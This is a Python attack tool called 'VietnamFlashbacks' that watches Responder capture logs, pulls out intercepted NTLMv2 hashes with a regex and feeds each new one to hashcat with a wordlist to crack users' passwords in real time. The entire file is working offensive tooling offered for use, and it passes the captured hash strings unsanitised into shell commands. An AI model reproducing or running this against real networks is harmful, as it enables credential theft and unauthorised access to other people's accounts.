#!/usr/bin/python3

import getopt   # for getting those command line arguments
import os    # for os path stuff
import platform    # for detectind whether it is Nix or Windows
import re    # for searching for hashes
import subprocess    # for spawning hashcat process
import sys    # for stopping gracefully
from termcolor import colored    # for not to miss this recovered pass :)
import traceback    # for when it shits its pants and doesn't stop gracefully

vietnam = """
 _     _  __________      __   _     
\ \  /| || |_  | || |\ | / /\ | |\/| 
 \_\/ |_||_|__ |_||_| \|/_/--\|_|  | 

"""
flashbacks = """
 _____     __   __  _    ___   __    __   _    __  
| |_| |   / /\ ( (`| |_|| |_) / /\  / /` | |_/( (` 
|_| |_|__/_/--\_)_)|_| ||_|_)/_/--\ \_\_,|_| \_)_) 
"""

print(colored(vietnam, "green", attrs=['bold']))
print(colored(flashbacks, "green", attrs=['bold']))

print(colored("Real-time NTLMv2 bruteforcer, VietnamFlashbacks 0.8.5alpha", "yellow", attrs=['bold']))
print("Press Ctrl+C as soon as you pwnd what you wanted\n")

print("Brought to you by Dmitry Kireev (@InfiniteSuns)\n")

responderdir = None
dictdir = None
hashcatdir = None

#osname = platform.system()

try:
    opts, args = getopt.getopt(sys.argv[1:], "hr:d:c:", ["responderdir=", "dictdir=", "hashcatdir="])
except getopt.GetoptError:
    print('VietnamFlashbacks.py -r <responder dir> -d <dictionary file> -c <hashcat dir>')
    sys.exit(2)

for o, a in opts:
    if o in ("-h", "--help"):
        print("\nVietnamFlashbacks.py -r <responder dir> -d <dictionary file> -c <hashcat dir>\n")
        sys.exit()
    elif o in ("-r", "--responder"):
        print("[i] Responder path recieved as argument")
        if os.path.exists(a):
            print("[+] Responder path seems legit\n")
            responderdir = a
        else:
            print("[-] Responder path seems not legit\n")
            sys.exit()
    elif o in ("-d", "--dictionary"):
        print("[i] Dictionary path recieved as argument")
        if os.path.exists(a):
            print("[+] Dictionary path seems legit\n")
            dictdir = a
        else:
            print("[-] Dictionary path seems not legit\n")
            sys.exit()
    elif o in ("-c", "--hashcat"):
        print("[i] Hashcat path recieved as argument")
        if os.path.exists(a):
            print("[+] Hashcat path seems legit\n")
            hashcatdir = a
        else:
            print("[-] Hashcat path seems not legit\n")
            sys.exit()
    else:
        assert False, "unhandled option"

print("[i] Checking current directory")
try:
    process = subprocess.Popen("pwd", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, shell=True, universal_newlines=True)
except Exception:
    print(colored("[!] Had hard time checking current directory and failed!",
                  "red"))
    traceback.print_exc(file=sys.stdout)
    sys.exit(0)

workingdir = process.stdout.readlines()
workingdir = str.strip(workingdir[0])
print("[i] Directory detected as " + workingdir + "\n")

logfile = workingdir + "/VietnamFlashbacks.log"

print("[~] Checking if logfile exists")
if os.path.exists(logfile):
    print("[i] Logfile already exists\n")
else:
    logfileptr = open(logfile, "w")
    logfileptr.close()
    print("[i] Logfile was created\n")

ntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*)')    # regexp too look for in responder logs

try:
    while True:
        for file in os.listdir(responderdir):
            if file.endswith(".txt"):
                for i, line in enumerate(open(os.path.join(responderdir, file))):
                    for match in re.finditer(ntlmv2pattern, line):
                        username = match.groups()[0].split('::')[0]

                        try:
                            logfilebuf = open(logfile, "r").read()
                        except Exception:
                            print(colored("[!] Had hard time reading logfile and failed!",
                                          "red"))
                            traceback.print_exc(file=sys.stdout)
                            sys.exit(0)

                        if not username in logfilebuf:
                            print(colored("[+] New hash discovered for " + username + ", writing to logfile",
                                          "green"))
                            print("[i] Passing to hashcat\n")

                            output = subprocess.Popen(
                                "hashcat -m 5600 " + match.groups()[0] + " " + dictdir,
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                            results = output.stdout.readlines()
                            errors = output.stderr.readlines()

                            for error in errors:    # sometimes hashcat freezes in background, have to deal with it
                                if "running on pid" in error:
                                    pidpattern = re.compile('(pid \d+)')
                                    pid = re.search(pidpattern, error).group()
                                    pid = pid.replace("pid ", "")

                                    output = subprocess.Popen(
                                        "kill " + pid,
                                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                                    results = output.stdout.readlines()
                                    errors = output.stderr.readlines()

                                    print(colored("[!] Looks like hashcat freezed in background, had to kill it\n",
                                                  "red"))

                            for result in results:
                                if "Recovered" in result:
                                    if "1/1" in result:
                                        print(colored("[!] Password recovered for " + username + "\n",
                                                      "red", attrs=['bold']))

                            logfileptr = open(logfile, "a")
                            logfileptr.write(match.groups()[0])
                            logfileptr.write('\n')
                            logfileptr.close()
except KeyboardInterrupt:
    print(colored("[i] Ctrl+C caught, stopping gracefully",
                  "red"))
except Exception:
    traceback.print_exc(file=sys.stdout)
    sys.exit(0)
